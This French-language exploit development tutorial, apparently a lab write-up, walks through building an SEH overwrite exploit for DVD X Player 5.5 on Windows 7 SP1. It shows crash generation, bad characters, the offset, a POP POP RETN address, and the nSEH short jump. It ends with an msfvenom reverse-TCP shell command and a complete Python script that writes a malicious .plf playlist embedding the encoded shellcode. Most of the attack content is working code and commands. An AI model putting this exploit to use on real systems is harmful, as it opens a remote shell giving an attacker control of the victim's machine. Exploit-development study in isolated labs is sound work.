# Windows dev exploit SEH - DVD X Player 5.5

Prérequis :

https://www.exploit-db.com/exploits/45403

* [DVD X Player 5.5](https://www.exploit-db.com/apps/cdfda7217304f4deb7d2e8feb5696394-DVDXPlayerSetup.exe)
* [Windows 7 SP1 x86](https://www.mes-vms.fr/machine-virtuelle-windows-7-professionnel-sp1-32bits/)
* [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
* [Mona](https://github.com/corelan/mona)

1. Fuzzing
2. Identifier l'exception
3. Identifier les badchars
4. Créer un pattern
5. Localiser le SEH
6. Trouver un POP POP RETN
7. Remplacer le nSEH
8. Générer l'exploit

## Etape 1 : Fuzzing

A faire

## Etape 2 : Identifier l'exception

```PYTHON

filename="crash.mp3"
buffer ="A"*5000
textfile=open(filename, 'w')
textfile.write(buffer)
textfile.close()

```

L'EIP est bien écrasé mais ECX ne contient pas encore les 41 ("A")

![](images/first_crash.png)

On jump après la première exeception dans immunity debugger avec Shift + F9

![](images/second_crash.png)

L'EIP est bien écrasé et ECX contient les 41 ("A")


4120 CRASH SEH

SEH record 4116

## Etape 3 : Identifier les badchars 

Les badchars sont \x00\x0a\x0d\x1a


## Etape 4 : Créer un pattern 

On créer un pattern

```BASH
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
```


## Etape 5 : Localiser le SEH

On trouve la position du SEH dans immunity debugger avec mona : 

```
!mona findmsp
```
![](images/findmsp.png)

On a junk + nSEH + SEH + junk : "A" * 608 + nSEH + SEH + "D" * (2000 - 608 - 4 - 4)

## Etape 6 : Trouver un POP POP RETN

On cherche ensuite un SEH avec POP POP RETN : 
```
!mona seh 
```

Aller voir dans le fichier [seh.txt](files/seh.txt) dans le dossier de Immunity Debugger.

On cherche une ligne avec que des "False" et une adresse qui ne contiennent pas de badchars

```
0x6032d03b : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [Configuration.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.2.5.2007 (C:\Program Files\Aviosoft\DVD X Player 5.5 Professional\Configuration.dll)
```
On réexécute le programme en modifiant l'adresse du SEH


## Etape 7 : Remplacer le nSEH


Normalement dans immunity debugger l'instruction est précédée de 4 x 42

![](images/jmp_nseh.png)

Clique droit dessus => Assemble , on entre alors une adresse où les 44 (D) sont présents
 : jmp 0012F581

![](images/replace_jmp_nseh.png)

On voit que les deux premières instructions sont remplacées par EB 0F

Mais pas les deux suivantes (42 42) donc notre SEH vaudra : eb 0f 90 90


On a alors : junk + nSEH + SEH + junk : 
```
"A" * 608 + "\x90\x90\x0f\xeb" + "\x3b\xd0\x32\x60" + "D" * (2000 - 608 - 4 - 4)
```

## Etape 8 : Générer l'exploit

On ajoute des NOP après le SEH pour être sur que l'exploit s'exécute bien, ce qui nous donne :

```
"A" * 608 + "\x90\x90\x0f\xeb" + "\x3b\xd0\x32\x60" + 16*"\x90" + "D" * (2000 - 608 - 4 - 4 - 16)
```

Enfin on ajoute notre Shellcode :
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.103 LPORT=443 -b"\x00\x0a\x0d\x1a" -f python EXITFUNC=thread -a x86
```

Notre exploit final :

```
"A" * 608 + "\x90\x90\x0f\xeb" + "\x3b\xd0\x32\x60" + 16*"\x90" + shellcode + "D" * (2000 - 608 - 4 - 4 - 16 - len(shellcode))
```

![](images/reverse_shell_ok.png)


```PYTHON
filename="exploit.plf"

buf =  ""
buf += "\xda\xd8\xd9\x74\x24\xf4\xba\xa9\xf7\x2d\xc1\x58\x2b"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x13\x03\xf9\xe4\xcf"
buf += "\x34\x05\xe2\x92\xb7\xf5\xf3\xf2\x3e\x10\xc2\x32\x24"
buf += "\x51\x75\x83\x2e\x37\x7a\x68\x62\xa3\x09\x1c\xab\xc4"
buf += "\xba\xab\x8d\xeb\x3b\x87\xee\x6a\xb8\xda\x22\x4c\x81"
buf += "\x14\x37\x8d\xc6\x49\xba\xdf\x9f\x06\x69\xcf\x94\x53"
buf += "\xb2\x64\xe6\x72\xb2\x99\xbf\x75\x93\x0c\xcb\x2f\x33"
buf += "\xaf\x18\x44\x7a\xb7\x7d\x61\x34\x4c\xb5\x1d\xc7\x84"
buf += "\x87\xde\x64\xe9\x27\x2d\x74\x2e\x8f\xce\x03\x46\xf3"
buf += "\x73\x14\x9d\x89\xaf\x91\x05\x29\x3b\x01\xe1\xcb\xe8"
buf += "\xd4\x62\xc7\x45\x92\x2c\xc4\x58\x77\x47\xf0\xd1\x76"
buf += "\x87\x70\xa1\x5c\x03\xd8\x71\xfc\x12\x84\xd4\x01\x44"
buf += "\x67\x88\xa7\x0f\x8a\xdd\xd5\x52\xc3\x12\xd4\x6c\x13"
buf += "\x3d\x6f\x1f\x21\xe2\xdb\xb7\x09\x6b\xc2\x40\x6d\x46"
buf += "\xb2\xde\x90\x69\xc3\xf7\x56\x3d\x93\x6f\x7e\x3e\x78"
buf += "\x6f\x7f\xeb\x2f\x3f\x2f\x44\x90\xef\x8f\x34\x78\xe5"
buf += "\x1f\x6a\x98\x06\xca\x03\x33\xfd\x9d\xeb\x6c\xfc\x3a"
buf += "\x84\x6e\xfe\xc5\xef\xe6\x18\xaf\x1f\xaf\xb3\x58\xb9"
buf += "\xea\x4f\xf8\x46\x21\x2a\x3a\xcc\xc6\xcb\xf5\x25\xa2"
buf += "\xdf\x62\xc6\xf9\xbd\x25\xd9\xd7\xa9\xaa\x48\xbc\x29"
buf += "\xa4\x70\x6b\x7e\xe1\x47\x62\xea\x1f\xf1\xdc\x08\xe2"
buf += "\x67\x26\x88\x39\x54\xa9\x11\xcf\xe0\x8d\x01\x09\xe8"
buf += "\x89\x75\xc5\xbf\x47\x23\xa3\x69\x26\x9d\x7d\xc5\xe0"
buf += "\x49\xfb\x25\x33\x0f\x04\x60\xc5\xef\xb5\xdd\x90\x10"
buf += "\x79\x8a\x14\x69\x67\x2a\xda\xa0\x23\x4a\x39\x60\x5e"
buf += "\xe3\xe4\xe1\xe3\x6e\x17\xdc\x20\x97\x94\xd4\xd8\x6c"
buf += "\x84\x9d\xdd\x29\x02\x4e\xac\x22\xe7\x70\x03\x42\x22"


buffer ="A"*608+"\xeb\x0f\x90\x90"+"\x3b\xd0\x32\x60"+16*"\x90"+buf+"D"*(2000-608-4-4-len(buf)-16)
textfile=open(filename, 'w')
textfile.write(buffer)
textfile.close()
```

Source : https://www.fuzzysecurity.com/tutorials/expDev/3.html